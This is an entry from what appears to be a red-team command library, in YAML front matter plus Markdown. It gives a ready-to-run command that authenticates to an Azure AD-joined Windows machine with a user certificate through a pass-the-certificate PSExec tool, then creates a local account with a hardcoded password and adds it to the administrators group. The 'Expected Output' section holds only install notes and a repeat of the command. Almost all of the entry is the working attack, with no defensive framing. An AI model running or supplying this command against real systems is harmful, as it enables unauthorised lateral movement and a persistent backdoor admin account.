---
id: 82781298-d670-49da-bd09-c302a9141527
name: Use Azure Cert with PSExec remote add admin user
type: command
executor: powershell
data: AdureADJoinedMachinePTC.py --usercert <username>@<tenant>.onmicrosoft.com.pfx
  --certpass AzureADCert --remoteip $TARGET_IP --command "cmd.exe /c net user username
  Password@123 /add /Y && net localgroup administrators username /add"
output: '# Installation instructtions for the tool

  # https://github.com/morRubin/AzureADJoinedMachinePTC

  # pip3 install impacket minikerberos cryptography==3.1.1 pyasn1

  Main.py --usercert <username>@<tenant>.onmicrosoft.com.pfx --certpass AzureADCert
  --remoteip 10.10.10.10 --command "cmd.exe /c net user username Password@123 /add
  /Y && net localgroup administrators username /add"'
created_at: '2023-05-25T18:50:44.626890+00:00'
updated_at: '2023-05-25T18:50:44.779119+00:00'
---

# Use Azure Cert with PSExec remote add admin user

```powershell
AdureADJoinedMachinePTC.py --usercert <username>@<tenant>.onmicrosoft.com.pfx --certpass AzureADCert --remoteip $TARGET_IP --command "cmd.exe /c net user username Password@123 /add /Y && net localgroup administrators username /add"
```

## Expected Output

```
# Installation instructtions for the tool
# https://github.com/morRubin/AzureADJoinedMachinePTC
# pip3 install impacket minikerberos cryptography==3.1.1 pyasn1

Main.py --usercert <username>@<tenant>.onmicrosoft.com.pfx --certpass AzureADCert --remoteip 10.10.10.10 --command "cmd.exe /c net user username Password@123 /add /Y && net localgroup administrators username /add"
```
